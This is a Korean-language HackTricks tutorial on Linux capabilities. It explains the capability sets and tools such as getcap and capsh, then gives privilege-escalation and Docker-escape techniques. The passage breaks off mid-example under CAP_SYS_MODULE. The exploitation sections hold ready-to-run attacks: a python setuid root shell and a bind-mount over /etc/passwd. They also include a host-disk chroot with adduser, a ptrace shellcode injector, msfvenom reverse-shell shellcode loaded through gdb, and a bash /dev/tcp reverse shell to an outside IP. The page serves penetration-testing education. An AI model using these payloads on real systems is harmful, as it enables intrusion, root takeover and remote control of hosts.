# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux capabilities는 **root privileges를 더 작고 독립적인 단위로 나누어**, process가 privileges의 일부만 갖도록 합니다. 이를 통해 full root privileges를 불필요하게 부여하지 않아 위험을 줄일 수 있습니다.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### 문제:

- 일반 사용자는 raw sockets를 열거나 1024 미만의 Internet ports에 bind하는 등의 작업에 제한된 permissions만 갖습니다. capabilities를 사용하면 full root privilege 대신 필요한 작업만 부여할 수 있습니다.<sup>[[14]](#references)</sup>

### Capability Sets:

Linux는 thread마다 다음 capability sets를 제공하며, process가 credentials를 변경하거나 file을 실행할 때 kernel이 해당 제약을 적용합니다.<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

- **Purpose**: 실행된 file에 일치하는 inheritable file capabilities가 있을 때 `execve()` 이후 permitted set에 기여할 수 있는 capabilities를 식별합니다.
- **Functionality**: thread의 inheritable set은 `execve()` 전반에서 유지되지만, 그 자체로 해당 capabilities를 effective하게 만들지는 않습니다.
- **Restrictions**: 이 set에 capability를 추가하는 작업은 permitted 및 bounding sets의 제약을 받습니다.<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

- **Purpose**: process가 어느 순간 실제로 사용하는 capabilities를 나타냅니다.
- **Functionality**: 다양한 작업에 permission을 부여하기 위해 kernel이 확인하는 capabilities set입니다. file의 경우, file의 permitted capabilities를 effective한 것으로 간주할지 나타내는 flag일 수 있습니다.
- **Significance**: effective set은 즉각적인 privilege checks에 필수적이며, process가 사용할 수 있는 capabilities의 active set 역할을 합니다.

3. **Permitted (CapPrm)**:

- **Purpose**: process가 보유할 수 있는 capabilities의 최대 set을 정의합니다.
- **Functionality**: process는 permitted set의 capability를 effective set으로 올려 해당 capability를 사용할 수 있습니다. 또한 permitted set에서 capabilities를 제거할 수도 있습니다.
- **Boundary**: 이 set에서 capability를 제거하면, 해당 capability를 부여하는 file을 실행하거나 다른 privileged transition을 수행하지 않는 한 일반적으로 복원할 수 없습니다.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

- **Purpose**: `execve()` 중 file에서 process가 얻을 수 있는 capabilities와 inheritable set에 추가할 수 있는 capabilities를 제한합니다.
- **Functionality**: 이 set은 `fork()` 전반에서 상속되고 `execve()` 전반에서 유지됩니다. caller가 `CAP_SETPCAP`을 보유한 경우 이 set에서 capabilities를 제거할 수 있습니다.
- **Use-case**: 이 set에서 불필요한 capabilities를 제거하면 이후 privilege acquisition을 제한할 수 있습니다.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
- **Purpose**: nonprivileged program의 `execve()` 전반에서 선택한 capabilities가 permitted 및 effective 상태로 유지되도록 합니다.
- **Functionality**: 실행된 file이 privileged하지 않으면 ambient capabilities가 새로운 permitted 및 effective sets에 추가됩니다.
- **Restrictions**: capability가 ambient 상태이려면 permitted 및 inheritable sets 모두에 존재해야 합니다. set-user-ID/set-group-ID file 또는 capabilities가 있는 file을 실행하면 ambient set이 삭제됩니다.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Processes & Binaries Capabilities

### Processes Capabilities

특정 process의 capabilities를 확인하려면 /proc directory의 **status** file을 사용합니다. 더 많은 details를 제공하므로 Linux capabilities와 관련된 정보만 표시하도록 제한해 보겠습니다.\
실행 중인 모든 processes의 capability information은 thread별로 유지되며, file capabilities는 `security.capability` extended attributes에 저장됩니다.<sup>[[14]](#references)[[15]](#references)</sup>

capabilities는 /usr/include/linux/capability.h에 정의되어 있습니다.

현재 process의 capabilities는 `cat /proc/self/status` 또는 `capsh --print`로 확인할 수 있으며, 다른 processes의 capabilities는 `/proc/<pid>/status`에서 확인할 수 있습니다.<sup>[[15]](#references)[[26]](#references)</sup>
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
대부분의 시스템에서 이 명령은 5개의 capability 행을 반환해야 합니다.<sup>[[15]](#references)</sup>

- CapInh = 상속된 capabilities
- CapPrm = 허용된 capabilities
- CapEff = 유효한 capabilities
- CapBnd = Bounding set
- CapAmb = Ambient capabilities set
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
이 16진수는 의미가 분명하지 않습니다. `capsh` utility를 사용하면 이를 capability 이름으로 디코딩할 수 있습니다.<sup>[[26]](#references)</sup>
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
이제 `ping`에서 사용하는 **capabilities**를 확인해 보겠습니다:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
이 방법도 작동하지만, 더 쉽고 간단한 방법이 있습니다. 실행 중인 process의 capabilities를 확인하려면 **getpcaps** tool 뒤에 해당 process의 process ID(PID)를 입력하면 됩니다. 이 tool은 process ID 목록도 허용합니다.<sup>[[22]](#references)</sup>
```bash
getpcaps 1234
```
`cap_net_admin` 및 `cap_net_raw`를 binary `tcpdump`에 부여한 후 네트워크를 sniff할 수 있는지 `tcpdump`의 capabilities를 확인해 보겠습니다(`tcpdump`는 process 9562에서 실행 중입니다).<sup>[[22]](#references)[[25]](#references)</sup>
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
보시다시피 capabilities는 process를 검사하는 두 가지 방법의 결과와 일치합니다. `getpcaps` tool은 libcap을 사용하여 대상 process의 capabilities를 조회하고 이를 텍스트 형식으로 출력하며, 하나 이상의 PID를 인수로 받을 수 있습니다.<sup>[[22]](#references)</sup>

### Binaries Capabilities

Binaries에는 실행 중 적용되는 file capabilities가 있을 수 있습니다. 예를 들어 `ping` binary에는 `cap_net_raw` capability가 포함될 수 있습니다.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
`getcap -r`을 사용하여 capabilities가 있는 binary를 검색할 수 있습니다.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### capsh를 사용하여 capabilities 제거

현재 bounding set에서 `CAP_NET_RAW`를 제거하면 해당 capability가 필요한 프로그램은 더 이상 이를 사용할 수 없어야 합니다.<sup>[[26]](#references)</sup>
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
_capsh_ 자체의 출력 외에도, _tcpdump_ 명령 자체에서도 오류가 발생해야 합니다.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

이 오류는 `CAP_NET_RAW`가 bounding set에서 제거된 후 `tcpdump`가 요청된 file capability로 실행될 수 없음을 보여 줍니다.

### Remove Capabilities

`setcap -r`을 사용하면 파일의 capabilities를 제거할 수 있습니다.<sup>[[25]](#references)</sup>
```bash
setcap -r </path/to/binary>
```
## User Capabilities

Linux는 로그인 사용자에게 file capabilities를 직접 할당하지 않지만, `pam_cap` PAM module은 `/etc/security/capability.conf`를 사용하여 인증된 session에 inheritable capabilities를 설정할 수 있습니다.<sup>[[16]](#references)</sup> 각 항목은 쉼표로 구분된 capability 이름 또는 번호를 하나 이상의 사용자 이름에 매핑합니다.<sup>[[17]](#references)</sup>
파일 예시:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## 환경 Capabilities

다음 프로그램을 compile하면 **capabilities를 제공하는 environment 내부에서 bash shell을 spawn할 수 있습니다**.<sup>[[14]](#references)</sup>
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**컴파일된 ambient binary에 의해 실행된 bash** 내부에서 **새로운 capabilities**를 확인할 수 있습니다(일반 사용자는 "current" 섹션에 어떠한 capability도 갖지 않습니다).<sup>[[14]](#references)</sup>
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> **permitted set과 inheritable set 모두에 존재하는 capabilities만 추가할 수 있습니다.**<sup>[[14]](#references)</sup>

### Capability-aware/Capability-dumb 바이너리

Capability-dumb 바이너리는 capabilities를 관리하기 위해 libcap을 사용하지 않는 file capabilities가 설정된 프로그램입니다. file effective bit가 설정되어 있으면 kernel은 해당 파일의 permitted capabilities를 process의 effective set에 활성화합니다. process가 모든 permitted capabilities를 획득하지 못한 경우 실행이 실패할 수 있습니다.<sup>[[14]](#references)</sup>

## 서비스 Capabilities

root로 실행되는 system service는 실행 환경이 capabilities를 제한하지 않는 한 광범위한 capabilities를 유지할 수 있습니다. systemd unit에서 `User=`는 service user를 지정하고, `AmbientCapabilities=`는 실행되는 process의 ambient set에 지정된 capabilities를 추가합니다.<sup>[[18]](#references)</sup>
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker Containers의 Capabilities

Docker는 `--cap-add` 및 `--cap-drop`을 사용하여 변경할 수 있는 기본 capability set으로 containers를 시작합니다. 예제 container는 `amicontained`로 검사할 수 있습니다.<sup>[[19]](#references)[[24]](#references)</sup>
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities는 **권한 있는 작업을 수행한 후 자신의 프로세스를 제한하려는 경우**(예: chroot를 설정하고 socket에 바인딩한 후) 유용합니다. 그러나 root 권한으로 실행되는 악의적인 명령이나 인자를 전달하여 악용할 수 있습니다.<sup>[[2]](#references)</sup>

`setcap`을 사용하여 프로그램에 file capabilities를 강제로 설정할 수 있으며, `getcap`을 사용하여 이를 조회할 수 있습니다.<sup>[[23]](#references)[[25]](#references)</sup>
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
파일 capability 표기에서 `+ep`는 지정된 capability를 effective 및 permitted set에 추가하고, `-`는 선택한 플래그를 제거합니다.<sup>[[21]](#references)</sup>

시스템 또는 폴더에서 capability가 설정된 프로그램을 식별하려면 `getcap -r`을 사용합니다.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Exploitation example

다음 예시에서 바이너리 `/usr/bin/python2.6`이 privesc에 취약한 것으로 확인됩니다:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
`tcpdump`에 필요한 **Capabilities**로 **모든 사용자가 패킷을 sniff할 수 있도록 허용**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "empty" capabilities의 특수한 경우

파일은 empty capability set을 가질 수 있습니다 (`getcap myelf` returns `myelf =ep`). empty set은 어떠한 capability도 부여하지 않습니다. 하지만 root-owned set-user-ID bit와 결합되면, 파일 capability를 획득하지 않고도 프로그램이 실행 중인 process의 effective ID와 saved ID를 0으로 변경할 수 있습니다. 소유자가 없고 SUID/SGID가 아닌 `=ep` 파일은 root로 실행되지 않습니다.<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**은 매우 강력한 Linux capability로, device mount 또는 kernel feature 조작과 같은 광범위한 **administrative privileges**를 제공하기 때문에 흔히 root에 가까운 수준으로 간주됩니다. 전체 system을 시뮬레이션하는 containers에는 필수적이지만, **`CAP_SYS_ADMIN`은 상당한 security challenges를 초래**하며, 특히 privilege escalation 및 system compromise 가능성 때문에 containerized environments에서 문제가 됩니다. 따라서 이 capability의 사용에는 엄격한 security assessments와 신중한 management가 필요하며, **principle of least privilege**를 준수하고 attack surface를 최소화하기 위해 application-specific containers에서는 이 capability를 제거하는 것이 강력히 권장됩니다.<sup>[[14]](#references)</sup>

**binary를 사용한 예시**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Python을 사용하면 수정된 _passwd_ 파일을 실제 _passwd_ 파일 위에 mount할 수 있습니다:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
마지막으로 수정한 `passwd` 파일을 `/etc/passwd`에 **mount**합니다:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
그리고 비밀번호 "password"를 사용하여 **`su` as root**를 수행할 수 있습니다.

**환경을 사용한 예시 (Docker breakout)**

다음을 사용하여 docker container 내부에서 활성화된 capabilities를 확인할 수 있습니다:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
이전 출력에서 SYS_ADMIN capability가 활성화되어 있는 것을 확인할 수 있습니다.<sup>[[14]](#references)</sup>

- **Mount**

적절한 device 및 namespace access가 있으면 Docker container가 **host disk를 mount하고 해당 contents에 access**할 수 있습니다.<sup>[[14]](#references)</sup>
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **전체 액세스**

이전 방법에서는 host 디스크에 액세스할 수 있었습니다.\
host에서 **ssh** 서버를 실행 중이라면 **마운트된 디스크 내부에 사용자를 생성**하고 SSH를 통해 액세스할 수 있습니다.<sup>[[14]](#references)</sup>
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

`CAP_SYS_PTRACE`를 사용하면 프로세스가 자신의 PID namespace에서 볼 수 있는 다른 프로세스를 추적하고 검사할 수 있습니다. Docker container에서 host 프로세스를 대상으로 하려면 `--pid=host`를 사용해 host PID namespace를 공유하거나, 대상 프로세스를 포함하는 namespace에 참여해야 합니다.<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**는 `ptrace(2)`가 제공하는 debugging 및 system call tracing 기능과 `process_vm_readv(2)`, `process_vm_writev(2)`와 같은 cross-memory attach 호출을 사용할 수 있는 권한을 부여합니다. 진단 및 monitoring 목적으로는 강력하지만, `ptrace(2)`에 대한 seccomp filter와 같은 제한 조치 없이 `CAP_SYS_PTRACE`가 활성화되면 system security를 크게 약화시킬 수 있습니다. 특히 [이와 같은 proof of concept (PoC)](https://gist.github.com/thejh/8346f47e359adecd1d53)에서 입증된 것처럼 seccomp가 적용한 제한을 비롯한 다른 security restrictions를 우회하는 데 악용될 수 있습니다.<sup>[[10]](#references)</sup>

**binary (python)를 사용한 예시**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**binary 예시 (gdb)**

`ptrace` capability가 있는 `gdb`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
msfvenom을 사용하여 gdb를 통해 메모리에 주입할 shellcode 생성
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
gdb를 사용하여 root 프로세스를 디버깅하고 이전에 생성된 gdb 줄을 복사하여 붙여넣습니다:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**환경을 사용한 예제(Docker breakout) - 또 다른 gdb Abuse**

**GDB**가 설치되어 있거나(예를 들어 `apk add gdb` 또는 `apt install gdb`로 설치할 수 있는 경우) **host에서 process를 debug**하여 `system` function을 호출하도록 만들 수 있습니다. (이 technique에는 `SYS_ADMIN` capability도 필요합니다.)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
실행된 command의 output은 볼 수 없지만 해당 process에 의해 실행됩니다(따라서 rev shell을 획득하세요).

> [!WARNING]
> `"No symbol "system" in current context."` 오류가 발생하면 gdb를 통해 program에 shellcode를 로드하는 이전 예시를 확인하세요.

**환경을 사용한 예시 (Docker breakout) - Shellcode Injection**

다음을 사용하여 docker container 내부에서 활성화된 capabilities를 확인할 수 있습니다:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
**host**에서 실행 중인 **프로세스** 목록 `ps -eaf`

1. **아키텍처** 확인 `uname -m`
2. 해당 아키텍처에 맞는 **shellcode** 찾기 ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. **프로세스 메모리**에 **shellcode**를 **inject**할 **program** 찾기 ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **program** 내부의 **shellcode**를 **수정**하고 **compile**하기 `gcc inject.c -o inject`
5. 이를 **inject**하고 **shell** 획득하기: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**은 프로세스가 **커널 모듈을 load 및 unload (`init_module(2)`, `finit_module(2)` 및 `delete_module(2)` 시스템 호출)**할 수 있도록 하여 커널의 핵심 작업에 직접 액세스할 수 있게 합니다. 이 capability는 모듈을 load하면 커널 동작을 수정하고 isolation boundary를 무력화할 수 있으므로 심각한 보안 위험을 초래합니다.<sup>[[6]](#references)[[14]](#references)</sup>
**이를 통해 프로세스에서 확인할 수 있는 커널에 모듈을 삽입하거나 제거할 수 있습니다. container에서는 이것이 host 커널인지 여부가 isolation configuration에 따라 달라집니다**.<sup>[[14]](#references)</sup>

**binary를 사용한 예시**

다음 예시에서 **`python`** binary에는 이 capability가 있습니다.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
기본적으로 **`modprobe`** 명령은 **`/lib/modules/$(uname -r)`** 디렉터리에서 의존성 목록 및 맵 파일을 확인합니다.\
이를 악용하기 위해 가짜 **lib/modules** 폴더를 생성해 보겠습니다:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
